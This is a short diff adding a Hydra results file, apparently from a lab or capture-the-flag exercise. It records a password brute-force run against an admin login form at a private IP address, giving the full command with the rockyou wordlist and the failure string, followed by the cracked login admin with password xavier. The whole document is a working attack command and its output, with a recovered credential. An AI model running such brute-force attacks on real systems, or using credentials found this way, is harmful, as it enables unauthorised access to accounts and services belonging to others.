@@ -1,0 +1,2 @@
+# Hydra v9.6 run at 2026-05-23 03:19:53 on 10.48.174.144 http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -o brute_force_result.txt 10.48.174.144 http-post-form /admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid)
+[80][http-post-form] host: 10.48.174.144   login: admin   password: xavier
